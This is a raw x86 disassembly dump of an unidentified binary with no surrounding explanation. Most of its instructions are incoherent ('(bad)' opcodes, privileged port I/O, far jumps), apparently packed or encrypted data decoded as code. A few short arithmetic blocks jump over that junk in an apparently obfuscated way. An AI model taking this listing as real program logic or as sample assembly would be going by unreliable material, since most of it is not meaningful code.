  40c83c:	sub    ebp,eax
  40c83e:	xchg   DWORD PTR [ecx],ebx
  40c840:	shr    BYTE PTR [ebp-0x3da4b5da],cl
  40c846:	cmp    al,0xd4
  40c848:	pop    edx
  40c849:	xchg   DWORD PTR [ecx+eiz*8+0x30b62432],ebp
  40c850:	or     dh,al
  40c852:	out    dx,al
  40c853:	jle    0x40c8d2
  40c855:	push   eax
  40c856:	dec    edx
  40c857:	xchg   ah,bh
  40c859:	js     0x40c8cc
  40c85b:	fcmovu st,st(6)
  40c85d:	mov    dh,BYTE PTR [eax+ebx*4]
  40c860:	inc    edi
  40c861:	sahf   
  40c862:	cli    
  40c863:	lea    eax,[ecx+eax*4+0x58]
  40c867:	mov    BYTE PTR ds:0x6bd71445,bl
  40c86d:	jns    0x40c886
  40c86f:	mov    WORD PTR [eax],ds
  40c871:	or     DWORD PTR [ecx-0xe],esp
  40c874:	mov    DWORD PTR [esi-0x3347fa8c],ebx
  40c87a:	sbb    cl,BYTE PTR [esi+0x18333b3e]
  40c880:	ins    DWORD PTR es:[edi],dx
  40c881:	xchg   DWORD PTR [edi],edi
  40c883:	push   ss
  40c884:	popf   
  40c885:	cwde   
  40c886:	pop    ss
  40c887:	mov    ah,0xf1
  40c889:	in     al,0xc8
  40c88b:	jecxz  0x40c82c
  40c88d:	cmc    
  40c88e:	loop   0x40c8b2
  40c890:	mov    al,ds:0xdb3d2d0e
  40c895:	jo     0x40c90f
  40c897:	mov    cl,BYTE PTR [edi-0x3a]
  40c89a:	jo     0x40c897
  40c89c:	mov    ds:0xdf559cb0,al
  40c8a1:	repz add dh,ch
  40c8a4:	ficom  DWORD PTR [ebx+esi*4-0x41]
  40c8a8:	xchg   ebp,eax
  40c8a9:	(bad)  
  40c8aa:	adc    DWORD PTR [ebx+ebp*4-0x2f],ebp
  40c8ae:	adc    al,0xdc
  40c8b0:	dec    esp
  40c8b1:	fwait
  40c8b2:	push   ebx
  40c8b3:	inc    ebx
  40c8b4:	pushf  
  40c8b5:	xchg   edi,eax
  40c8b6:	jp     0x40c83c
  40c8b8:	call   0x5a7bafc
  40c8bd:	push   0xaae9bfaa
  40c8c2:	xchg   DWORD PTR [ecx],esi
  40c8c4:	adc    ah,dh
  40c8c6:	(bad)  
  40c8c7:	sbb    BYTE PTR [ecx],ah
  40c8c9:	sub    al,0x81
  40c8cb:	and    esp,DWORD PTR [ebx+0x53]
  40c8ce:	popa   
  40c8cf:	add    DWORD PTR [esi+0x171266d4],esp
  40c8d5:	sub    BYTE PTR [ebp+0x34bb1f74],0x3f
  40c8dc:	mov    ds:0x9cf52636,eax
  40c8e1:	ja     0x40c914
  40c8e3:	mov    fs,ebx
  40c8e5:	stos   BYTE PTR es:[edi],al
  40c8e6:	mov    ah,BYTE PTR [ebx-0x3a]
  40c8e9:	mov    ch,ch
  40c8eb:	push   ebp
  40c8ec:	mov    dh,0x8b
  40c8ee:	jge    0x40c8d8
  40c8f0:	xor    edi,eax
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	xor    bh,BYTE PTR ds:0x94ecd319
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c90d
  40c925:	icebp  
  40c926:	sub    ah,BYTE PTR [ebx]
  40c928:	retf   
  40c929:	xor    al,0xf0
  40c92b:	mov    es:0x53afe4fd,al
  40c931:	ins    BYTE PTR es:[edi],dx
  40c932:	mov    WORD PTR [eax-0x2d],es
  40c935:	adc    bh,BYTE PTR [edi+0x32416063]
  40c93b:	fcom   DWORD PTR [ebp+0x3f]
  40c93e:	mov    eax,0x144d72c5
  40c943:	out    0x11,al
  40c945:	scas   al,BYTE PTR es:[edi]
  40c946:	test   eax,0x168a5ab1
  40c94b:	sbb    al,0x7f
  40c94d:	inc    edx
  40c94e:	push   esi
  40c94f:	xor    BYTE PTR [ecx+ecx*2],dl
  40c952:	popf   
  40c953:	sub    al,0x99
  40c955:	in     eax,dx
  40c956:	jne    0x40c93f
  40c958:	cld    
  40c959:	jle    0x40c908
  40c95b:	xor    al,0xd6
  40c95d:	ficom  WORD PTR [esi+0x672db9be]
  40c963:	shl    eax,0x3a
  40c966:	add    al,0xf8
  40c968:	pop    ss
  40c969:	mov    al,0x7c
  40c96b:	and    BYTE PTR [ecx+0x290c7040],al
  40c971:	dec    eax
  40c972:	gs lahf 
  40c974:	add    ch,BYTE PTR [ebp+0x129b0fa3]
  40c97a:	cmp    al,0xbe
  40c97c:	fwait
  40c97d:	mov    edx,0x75582152
  40c982:	fs loopne 0x40c906
  40c985:	std    
  40c986:	aam    0xc7
  40c988:	add    ah,BYTE PTR [edi+0x3a]
  40c98b:	repz rol BYTE PTR ds:0xff206fb,1
  40c992:	sbb    dl,dh
  40c994:	repz and eax,0x2cb3ee51
  40c99a:	mov    esp,0xeda4ef17
  40c99f:	sti    
  40c9a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9a1:	test   DWORD PTR [esi+0x71],esp
  40c9a4:	add    al,0xd2
  40c9a6:	jmp    0x96d82f51
  40c9ab:	jg     0x40c9c7
  40c9ad:	popf   
  40c9ae:	js     0x40c983
  40c9b0:	sbb    BYTE PTR ds:[edi-0x44],bh
  40c9b4:	ds gs in eax,dx
  40c9b7:	sub    BYTE PTR [edx-0xe],dl
  40c9ba:	mov    dh,0xce
  40c9bc:	outs   dx,DWORD PTR ds:[esi]
  40c9bd:	sub    ah,BYTE PTR [esi]
  40c9bf:	adc    edi,ebx
  40c9c1:	sbb    al,BYTE PTR [edx-0x5c]
  40c9c4:	sbb    al,BYTE PTR [edx+0x2a]
  40c9c7:	pop    ss
  40c9c8:	jb     0x40c9c2
  40c9ca:	sub    eax,0x7bd62065
  40c9cf:	test   BYTE PTR [ebx-0x5b],0x60
  40c9d3:	push   es
  40c9d4:	cmp    eax,0x1b705f11
  40c9d9:	imul   ecx,DWORD PTR [eax],0x7612aaf7
  40c9df:	or     eax,0xce549f0f
  40c9e4:	leave  
  40c9e5:	(bad)  
  40c9e6:	pop    ecx
  40c9e7:	in     al,0x85
  40c9e9:	pop    edi
  40c9ea:	push   ds
  40c9eb:	push   0xb5eb7b16
  40c9f0:	cli    
  40c9f1:	add    BYTE PTR [esi-0x72a84b7d],cl
  40c9f7:	scas   al,BYTE PTR es:[edi]
  40c9f8:	cmp    eax,0x6cc5c889
  40c9fd:	jns    0x40c988
  40c9ff:	and    ebx,ebp
  40ca01:	cld    
  40ca02:	sbb    al,BYTE PTR [ebx]
  40ca04:	imul   esi,ebp,0x6f
  40ca07:	les    ebx,FWORD PTR [esi-0x24]
  40ca0a:	into   
  40ca0b:	test   eax,0xa4f59943
  40ca10:	xchg   edi,eax
  40ca11:	jmp    0x1972:0xeb7e0406
  40ca18:	mov    ebx,0x34985e6d
  40ca1d:	adc    ecx,DWORD PTR es:[esi+0x46236df]
  40ca24:	mov    esi,0xd6929e8d
  40ca29:	and    BYTE PTR [ebp+0x61],bl
  40ca2c:	outs   dx,BYTE PTR ds:[esi]
  40ca2d:	pop    edx
  40ca2e:	pusha  
  40ca2f:	popf   
  40ca30:	sub    dl,bh
  40ca32:	scas   eax,DWORD PTR es:[edi]
  40ca33:	daa    
  40ca34:	not    dh
  40ca36:	jp     0x40ca74
  40ca38:	outs   dx,BYTE PTR ds:[esi]
  40ca39:	jbe    0x40ca40
  40ca3b:	xchg   edx,eax
  40ca3c:	ja     0x40c9c7
  40ca3e:	loop   0x40ca49
  40ca40:	inc    eax
  40ca41:	ds test ch,al
  40ca44:	and    esi,DWORD PTR [ebx]
  40ca46:	(bad)  
  40ca48:	jle    0x40ca78
  40ca4a:	lods   al,BYTE PTR ds:[esi]
  40ca4b:	xchg   esi,eax
  40ca4c:	and    esi,DWORD PTR [edx]
  40ca4e:	(bad)  
  40ca50:	nop
  40ca51:	shl    BYTE PTR [esi+0x39],0xc9
  40ca55:	inc    esp
  40ca56:	je     0x40ca97
  40ca58:	test   eax,0x7aa8e124
  40ca5d:	and    BYTE PTR [esi+0x63],ch
  40ca60:	imul   ebx,DWORD PTR [ebp+0x1eadaa30],0x8b59cb83
  40ca6a:	jb     0x40ca3f
  40ca6c:	cwde   
  40ca6d:	xor    ecx,DWORD PTR [ecx+0x7130589a]
  40ca73:	stos   BYTE PTR es:[edi],al
  40ca74:	sub    eax,0xba0fc0e2
  40ca79:	push   ebp
  40ca7a:	dec    esp
  40ca7b:	dec    esp
  40ca7c:	jl     0x40ca61
  40ca7e:	leave  
  40ca7f:	xchg   ebp,eax
  40ca80:	xchg   edx,eax
  40ca81:	sub    eax,0x53ae5852
  40ca86:	push   cs
  40ca87:	adc    DWORD PTR [esp+ecx*4],ebp
  40ca8a:	xchg   ecx,eax
  40ca8b:	mov    ebp,0xb0776d69
  40ca90:	inc    ebp
  40ca91:	rcr    DWORD PTR [edi-0x9],1
  40ca94:	les    edx,FWORD PTR [edx+0x1d]
  40ca97:	mov    eax,0xfb7532dc
  40ca9c:	ror    DWORD PTR [edx+ebp*1+0x6e],0x34
  40caa1:	sub    esp,ebx
  40caa3:	imul   ah
  40caa5:	mov    DWORD PTR [ebx],esp
  40caa7:	push   edi
  40caa8:	jns    0x40cae4
  40caaa:	les    ebx,FWORD PTR [esi-0x2a40aa93]
  40cab0:	xchg   ah,dl
  40cab2:	push   ss
  40cab3:	sub    al,0x74
  40cab5:	mov    edi,0xa47ade13
  40caba:	xchg   BYTE PTR [edx],ah
  40cabc:	pushw  ss
  40cabe:	mov    cl,0x82
  40cac0:	rcr    BYTE PTR [edx+ebp*2-0x7e],1
  40cac4:	pop    esi
  40cac5:	and    BYTE PTR [ebx-0x764e5f3d],0x74
  40cacc:	arpl   WORD PTR [ebx+0x32],bx
  40cacf:	stos   DWORD PTR es:[edi],eax
  40cad0:	cli    
  40cad1:	jp     0x40cae8
  40cad3:	mov    DWORD PTR ss:[edx+0x41b8c710],edx
  40cada:	pop    edi
  40cadb:	(bad)  
  40cadc:	fmul   st(2),st
  40cade:	retf   0xc547
  40cae1:	jmp    0x9781:0x9aa1be06
  40cae8:	and    bl,BYTE PTR [esi]
  40caea:	stc    
  40caeb:	inc    edi
  40caec:	jne    0x40cb33
  40caee:	pop    eax
  40caef:	jmp    0x57d2c5e9
  40caf4:	loop   0x40cae7
  40caf6:	popf   
  40caf7:	xchg   ebx,eax
  40caf8:	sub    eax,0x62cc6f8c
  40cafd:	inc    esi
  40cafe:	xchg   esp,eax
  40caff:	cmp    BYTE PTR [ebp+0x3fb23a38],bl
  40cb05:	add    dl,BYTE PTR [edx+0x25fc5ba]
  40cb0b:	out    dx,al
  40cb0c:	ins    BYTE PTR es:[edi],dx
  40cb0d:	xchg   BYTE PTR [edi-0x1d],dl
  40cb10:	xchg   esp,eax
  40cb11:	push   eax
  40cb12:	jno    0x40caf2
  40cb14:	push   esp
  40cb15:	or     esi,edx
  40cb17:	add    eax,0x6639e3c8
  40cb1c:	iret   
  40cb1d:	add    DWORD PTR ds:0xb376794c,ebp
  40cb23:	add    al,0x63
  40cb25:	mov    edi,0xd67bc58e
  40cb2a:	les    eax,FWORD PTR ds:0xe10cd503
  40cb30:	mov    bh,0x76
  40cb32:	mul    esp
  40cb34:	jle    0x40cb1b
  40cb36:	mov    esi,ebp
  40cb38:	inc    edx
  40cb39:	inc    eax
  40cb3a:	xlat   BYTE PTR ds:[ebx]
  40cb3b:	or     BYTE PTR [ebx-0x65],dh
  40cb3e:	ror    DWORD PTR [edx],0x64
  40cb41:	in     eax,dx
  40cb42:	test   BYTE PTR [ecx-0x7d],bl
  40cb45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb46:	mov    al,0x93
  40cb48:	inc    esp
  40cb49:	aas    
  40cb4a:	je     0x40cba0
  40cb4c:	sar    DWORD PTR [ebx+0x10],cl
  40cb4f:	(bad)  
  40cb50:	jle    0x40caf4
  40cb52:	mov    edi,0x7cb1a183
  40cb57:	(bad)  
  40cb58:	cld    
  40cb59:	iret   
  40cb5a:	and    al,BYTE PTR [edi-0x5c41c967]
  40cb60:	jbe    0x40cb83
  40cb62:	mov    ah,0x36
  40cb64:	cmp    eax,0xbfbfbb0
  40cb69:	and    dh,BYTE PTR gs:[ecx+0x7d]
  40cb6d:	inc    ebp
  40cb6e:	leave  
  40cb6f:	inc    edx
  40cb70:	push   ebp
  40cb71:	test   dh,al
  40cb73:	stos   BYTE PTR es:[edi],al
  40cb74:	retf   0xc80d
  40cb77:	int    0xe
  40cb79:	addr16 mov dl,0x23
  40cb7c:	imul   ebx,DWORD PTR [ebp-0x6c172041],0x67235b6b
  40cb86:	enter  0x5b6c,0x2b
  40cb8a:	mov    edx,0xfbf573e7
  40cb8f:	push   esp
  40cb90:	xchg   ebp,eax
  40cb91:	cmp    ch,0x42
  40cb94:	mov    DWORD PTR [ebp-0x31],ecx
  40cb97:	loope  0x40cb25
  40cb99:	rol    DWORD PTR [edi],1
  40cb9b:	jp     0x40cb76
  40cb9d:	cmp    eax,0x10ba7be7
  40cba2:	lsl    esp,WORD PTR [ebp-0x2f29fbb5]
  40cba9:	dec    eax
  40cbaa:	xchg   ebp,ecx
  40cbac:	sbb    esp,DWORD PTR [eax]
  40cbae:	pop    esi
  40cbaf:	pop    ss
  40cbb0:	addr16 pop ecx
  40cbb2:	hlt    
  40cbb3:	xor    ecx,ebp
  40cbb5:	pop    es
  40cbb6:	test   BYTE PTR [eax-0x53083cc3],ah
  40cbbc:	xchg   ecx,eax
  40cbbd:	das    
  40cbbe:	dec    ebp
  40cbbf:	ror    DWORD PTR [eax+0x3],cl
  40cbc2:	fcom   st(3)
  40cbc4:	cmp    ebp,DWORD PTR [ecx]
  40cbc6:	add    BYTE PTR [ecx+0x40],dl
  40cbc9:	scas   eax,DWORD PTR es:[edi]
  40cbca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbcb:	inc    ecx
  40cbcc:	cld    
  40cbcd:	inc    ebx
  40cbce:	pushw  es
  40cbd0:	ins    BYTE PTR es:[edi],dx
  40cbd1:	aam    0x13
  40cbd3:	test   BYTE PTR [edx+0x47],dh
  40cbd6:	jmp    0xbc3e:0x1af8064b
  40cbdd:	dec    eax
  40cbde:	fcmovu st,st(7)
  40cbe0:	jg     0x40cc55
  40cbe2:	std    
  40cbe3:	add    eax,0x6a134f5f
  40cbe8:	clc    
  40cbe9:	xchg   ebx,eax
  40cbea:	jp     0x40cbf7
  40cbec:	cld    
  40cbed:	mov    dh,0x85
  40cbef:	fcomp  QWORD PTR ds:0xd83ed89a
  40cbf5:	aaa    
  40cbf6:	inc    ecx
  40cbf7:	xor    dl,BYTE PTR [eax]
  40cbf9:	pop    ebp
  40cbfa:	jmp    0x831e:0x9bb77428
  40cc01:	sub    al,0x4d
  40cc03:	jae    0x40cbcf
  40cc05:	mov    al,0x54
  40cc07:	sub    eax,0x6fd6a0ed
  40cc0c:	or     edx,edi
  40cc0e:	imul   DWORD PTR [ecx+0x5b]
  40cc11:	xchg   BYTE PTR [esi+edx*1-0x4a],bl
  40cc15:	mov    ds:0x9b08fad6,eax
  40cc1a:	ficom  DWORD PTR [ebx+0x10]
  40cc1d:	xor    dh,dh
  40cc1f:	ins    BYTE PTR es:[edi],dx
  40cc20:	sub    BYTE PTR [esi],ch
  40cc22:	nop
  40cc23:	stos   DWORD PTR es:[edi],eax
  40cc24:	sbb    DWORD PTR [eax+0x6587ddbd],0xf0f48ac3
  40cc2e:	lds    eax,FWORD PTR [edi]
  40cc30:	scas   al,BYTE PTR es:[edi]
  40cc31:	dec    esp
  40cc32:	lea    edx,[edi]
  40cc34:	mov    al,0x45
  40cc36:	mov    dl,0xc9
  40cc38:	mov    bh,0xfa
  40cc3a:	fbld   TBYTE PTR [edx+0x60]
  40cc3d:	mov    eax,ds:0x2028c8e7
  40cc42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc43:	out    dx,eax
  40cc44:	xchg   edi,eax
  40cc45:	(bad)  
  40cc47:	jae    0x14f0b9aa
  40cc4d:	(bad)
  40cc52:	add    DWORD PTR [ebx-0x4baddad4],edx
  40cc58:	rol    DWORD PTR [esi+ecx*1-0x51659a13],0x14
  40cc60:	shr    BYTE PTR [bp+si],1
  40cc63:	jl     0x40ccbb
  40cc65:	(bad)  
  40cc66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc67:	pop    es
  40cc68:	aad    0xe1
  40cc6a:	pop    ebx
  40cc6b:	pop    ecx
  40cc6c:	xor    bh,ch
  40cc6e:	jg     0x40cc49
  40cc70:	outs   dx,BYTE PTR ds:[esi]
  40cc71:	cs retf 
  40cc73:	sub    BYTE PTR ds:0xb700f5e,dl
  40cc79:	sbb    DWORD PTR ds:0x861e74e2,esp
  40cc7f:	cmp    ecx,DWORD PTR [esi]
  40cc81:	inc    eax
  40cc82:	and    eax,0x9168a062
  40cc87:	ja     0x40cc59
  40cc89:	and    eax,0xead93ba3
  40cc8e:	cmp    al,0xaf
  40cc90:	shl    BYTE PTR [esi],cl
  40cc92:	jle    0x40cc31
  40cc94:	and    al,0xf6
  40cc96:	mov    cl,0xe8
  40cc98:	pop    ds
  40cc99:	xchg   edi,eax
  40cc9a:	sahf   
  40cc9b:	mov    al,ds:0x99715f9a
  40cca0:	dec    esp
  40cca1:	sbb    esp,esi
  40cca3:	adc    eax,0xf983b9bf
  40cca8:	mov    bh,0xc6
  40ccaa:	nop
  40ccab:	aaa    
  40ccac:	pop    ebp
  40ccad:	sub    dh,BYTE PTR [ebp+0xf566c52]
  40ccb3:	and    eax,0x72a719d5
  40ccb8:	adc    BYTE PTR ds:0x1381fac3,cl
  40ccbe:	jns    0x40cd29
  40ccc0:	icebp  
  40ccc1:	cmp    cl,ch
  40ccc3:	jne    0x40cc9f
  40ccc5:	xor    edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	adc    DWORD PTR [ebp+0xbc89bc9],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd41
  40cd23:	xchg   esp,eax
  40cd24:	test   al,dh
  40cd26:	and    eax,0xa6150de0
  40cd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd2c:	xor    eax,0x34c80d76
  40cd31:	sbb    BYTE PTR [eax],0x48
  40cd34:	pop    es
  40cd35:	cdq    
  40cd36:	es fsub st,st(0)
  40cd39:	fistp  DWORD PTR [edi+0x30]
  40cd3c:	sub    BYTE PTR [ebp+0x73f5f02a],ah
  40cd42:	ror    BYTE PTR [esi-0x23],0x17
  40cd46:	jns    0x40cd50
  40cd48:	repz dec edi
  40cd4a:	repz push ds
  40cd4c:	les    ebx,FWORD PTR [eax]
  40cd4e:	ret    
  40cd4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd50:	stos   DWORD PTR es:[edi],eax
  40cd51:	(bad)  
  40cd52:	xor    eax,0x813799da
  40cd57:	xchg   edx,eax
  40cd58:	sub    cl,BYTE PTR [edi]
  40cd5a:	call   0x50d7:0x72718553
  40cd61:	adc    ch,dh
  40cd63:	xchg   edx,eax
  40cd64:	fbstp  TBYTE PTR [eax]
  40cd66:	jge    0x40cd6c
  40cd68:	xchg   edx,eax
  40cd69:	mov    edi,0x6da92a4f
  40cd6e:	fld    TBYTE PTR [ebp+0x25]
  40cd71:	test   eax,0x12b6435c
  40cd76:	push   cs
  40cd77:	pop    ebx
  40cd78:	dec    eax
  40cd79:	pop    esi
  40cd7a:	leave  
  40cd7b:	out    dx,eax
  40cd7c:	or     esp,DWORD PTR [ecx-0x7f]
  40cd7f:	cmp    eax,0x23f7078a
  40cd84:	test   DWORD PTR [edi-0x54ea4ee2],eax
  40cd8a:	test   BYTE PTR [ecx+0x1b],al
  40cd8d:	sbb    eax,0x33e6b439
  40cd92:	push   cs
  40cd93:	push   esi
  40cd94:	(bad)  
  40cd95:	pop    ebp
  40cd96:	mov    al,0x8
  40cd98:	pcmpeqd mm2,mm3
  40cd9b:	ins    BYTE PTR es:[edi],dx
  40cd9c:	cwde   
  40cd9d:	jecxz  0x40cd35
  40cd9f:	mov    ah,0x26
  40cda1:	sahf   
  40cda2:	sub    DWORD PTR [edx],ecx
  40cda4:	xor    edi,esp
  40cda6:	bound  esi,QWORD PTR [ecx-0x43ad366d]
  40cdac:	outs   dx,BYTE PTR ds:[esi]
  40cdad:	sbb    BYTE PTR [edi],bl
  40cdaf:	jmp    0x40cdf2
  40cdb1:	mov    eax,DWORD PTR [ebp-0x7569812d]
  40cdb7:	addr16 or al,0x11
  40cdba:	lds    ecx,FWORD PTR [ebp+0x44]
  40cdbd:	fdiv   st(6),st
  40cdbf:	mov    dh,0xcf
  40cdc1:	jmpw   0x4d90
  40cdc5:	jle    0x40cdbf
  40cdc7:	sbb    ch,bl
  40cdc9:	test   al,0xba
  40cdcb:	adc    DWORD PTR [ebx],edx
  40cdcd:	mov    bl,0x58
  40cdcf:	jle    0x40ce45
  40cdd1:	mov    ds:0xed9caa2a,eax
  40cdd6:	(bad)  
  40cdd7:	cmp    bh,ah
  40cdd9:	xchg   ebp,eax
  40cdda:	lock and dh,BYTE PTR [eax+0x13ae9d9c]
  40cde1:	cmp    dl,ah
  40cde3:	pop    edx
  40cde4:	jo     0x40cd68
  40cde6:	xchg   ebx,eax
  40cde7:	and    DWORD PTR ds:0xf6d4e881,edi
  40cded:	aaa    
  40cdee:	xor    BYTE PTR [ebx],al
  40cdf0:	push   cs
  40cdf1:	fcom   QWORD PTR [eax+ecx*1-0x76]
  40cdf5:	fnstenv [edi]
  40cdf7:	add    BYTE PTR [ebx-0x2d25bed8],bh
  40cdfd:	nop
  40cdfe:	sbb    eax,0xd470e7e8
  40ce03:	mov    ah,0xa3
  40ce05:	cmp    cl,cl
  40ce07:	ror    edx,cl
  40ce09:	bnd jbe 0x40ce20
  40ce0c:	fs repz inc ebx
  40ce0f:	mov    esp,DWORD PTR [ecx-0x2cdbf413]
  40ce15:	jge    0x40ce53
  40ce17:	loopne 0x40ce4a
  40ce19:	test   eax,0xce4b5c8a
  40ce1e:	jl     0x40ce66
  40ce20:	ss sbb al,0x1c
  40ce23:	adc    al,0xf5
  40ce25:	push   ss
  40ce26:	dec    esp
  40ce27:	lea    ebp,[ebx]
  40ce29:	leave  
  40ce2a:	int3   
  40ce2b:	addr16 push ecx
  40ce2d:	ds xchg esp,eax
  40ce2f:	jmp    0x15bd34b3
  40ce34:	(bad)  
  40ce36:	ja     0x40ce17
  40ce38:	sub    ebp,DWORD PTR [edi+0x7e9b05d8]
  40ce3e:	ja     0x40cddf
  40ce40:	fcom   QWORD PTR [esi]
  40ce42:	jne    0x40ce4b
  40ce44:	fldenv [edi-0x5f]
  40ce47:	mov    edx,0x1a59086b
  40ce4c:	(bad)  
  40ce4d:	das    
  40ce4e:	aam    0xad
  40ce50:	mov    ds:0x2ca3b4da,eax
  40ce55:	jge    0x40ce6c
  40ce57:	xchg   BYTE PTR [eax+0x2dc108e5],al
  40ce5d:	dec    ebx
  40ce5e:	pop    esp
  40ce5f:	fmul   DWORD PTR [ebp+0x30]
  40ce62:	fsubr  DWORD PTR [ebp+0x63094ca9]
  40ce68:	xchg   ecx,eax
  40ce69:	mov    eax,ds:0x2d3d7797
  40ce6e:	pop    eax
  40ce6f:	xor    cl,cl
  40ce71:	mov    esp,0x3681a16
  40ce76:	jp     0x40ceee
  40ce78:	inc    esp
  40ce79:	sbb    al,0x2a
  40ce7b:	xchg   esp,eax
  40ce7c:	rcl    DWORD PTR ds:0x9c2a5ed1,0x5b
  40ce83:	jge    0x40ce62
  40ce85:	popf   
  40ce86:	popa   
  40ce87:	nop
  40ce88:	sbb    eax,0xcd9c33d8
  40ce8d:	inc    ebx
  40ce8e:	retf   
  40ce8f:	ret    0xa5d4
  40ce92:	adc    al,0x28
  40ce94:	out    0x3d,eax
  40ce96:	xchg   DWORD PTR [eax-0x717cb0e3],edx
  40ce9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce9d:	mov    edi,0xee53b245
  40cea2:	pop    ds
  40cea3:	aaa    
  40cea4:	mov    ds:0x623a32a9,al
  40cea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ceaa:	std    
  40ceab:	xchg   esp,eax
  40ceac:	test   DWORD PTR [ebx+ecx*1+0x4c],ecx
  40ceb0:	popa   
  40ceb1:	loope  0x40ceb5
  40ceb3:	mov    bl,0x5
  40ceb5:	rcl    BYTE PTR [ecx-0x6e60a5e5],0x96
  40cebc:	jecxz  0x40cefd
  40cebe:	shr    BYTE PTR [edx+0x17987537],cl
  40cec4:	sbb    dh,BYTE PTR [ecx-0xe]
  40cec7:	and    edx,DWORD PTR [edi+0xa]
  40ceca:	aaa    
  40cecb:	out    0x43,al
  40cecd:	pop    ecx
  40cece:	mov    eax,ds:0x7caec8a6
  40ced3:	shl    DWORD PTR [eax+0x67aaf36],1
  40ced9:	mov    al,0x4b
  40cedb:	into   
  40cedc:	test   BYTE PTR [esi],dl
  40cede:	jg     0x40cf08
  40cee0:	dec    esp
  40cee1:	xor    al,0xc5
  40cee3:	iret   
  40cee4:	bound  ebp,QWORD PTR [eax+0x66]
  40cee7:	stos   DWORD PTR es:[edi],eax
  40cee8:	sub    al,0x97
  40ceea:	sti    
  40ceeb:	or     ebx,eax
  40ceed:	ins    DWORD PTR es:[edi],dx
  40ceee:	ja     0x40ce7b
  40cef0:	int    0x3b
  40cef2:	in     al,0x16
  40cef4:	dec    esi
  40cef5:	push   edx
  40cef6:	lods   al,BYTE PTR ds:[esi]
  40cef7:	loopne 0x40cf24
  40cef9:	stos   BYTE PTR es:[edi],al
  40cefa:	adc    al,0x4f
  40cefc:	cmp    BYTE PTR [esi+0x35],ch
  40ceff:	lods   eax,DWORD PTR ds:[esi]
  40cf00:	jle    0x40cf3f
  40cf02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf03:	out    dx,eax
  40cf04:	pop    edi
  40cf05:	add    al,0x58
  40cf07:	pop    esp
  40cf08:	ficomp DWORD PTR [esi-0x69b08ae2]
  40cf0e:	push   ss
  40cf0f:	adc    eax,0x9cf26d74
  40cf14:	ja     0x40cee9
  40cf16:	push   esp
  40cf17:	dec    edi
  40cf18:	xchg   BYTE PTR [edx+0x7f576433],cl
  40cf1e:	ins    BYTE PTR es:[edi],dx
  40cf1f:	inc    esi
  40cf20:	sbb    eax,0xc8ee1c18
  40cf25:	jbe    0x40cf0d
  40cf27:	add    BYTE PTR [edx+0x63e61f82],ch
  40cf2d:	cmp    eax,DWORD PTR [esi+eax*8-0x2c07abee]
  40cf34:	push   ecx
  40cf35:	arpl   WORD PTR [edx+0x19],dx
  40cf38:	xchg   BYTE PTR [eax-0x2dffed29],dh
  40cf3e:	pop    ecx
  40cf3f:	dec    ebx
  40cf40:	les    ebx,FWORD PTR [ebx]
  40cf42:	pop    ebp
  40cf43:	lods   al,BYTE PTR ds:[esi]
  40cf44:	inc    esp
  40cf45:	dec    ebp
  40cf46:	outs   dx,BYTE PTR ds:[esi]
  40cf47:	pusha  
  40cf48:	sti    
  40cf49:	sbb    BYTE PTR [edi+0x5dea8290],0xfc
  40cf50:	mov    ebp,0x8e1d2701
  40cf55:	push   edx
  40cf56:	adc    esp,edi
  40cf58:	call   DWORD PTR [ebp-0x780b07c7]
  40cf5e:	scas   al,BYTE PTR es:[edi]
  40cf5f:	add    edi,DWORD PTR [ecx-0x39]
  40cf62:	dec    edx
  40cf63:	les    ecx,FWORD PTR es:[ecx-0x650fc9d3]
  40cf6a:	add    DWORD PTR [ebp-0x68],esi
  40cf6d:	inc    eax
  40cf6e:	push   ss
  40cf6f:	mov    edi,DWORD PTR [edi-0x237d6ba5]
  40cf75:	xor    ebx,DWORD PTR [edx+ecx*2]
  40cf78:	push   esi
  40cf79:	adc    al,bh
  40cf7b:	dec    ecx
  40cf7c:	pop    ecx
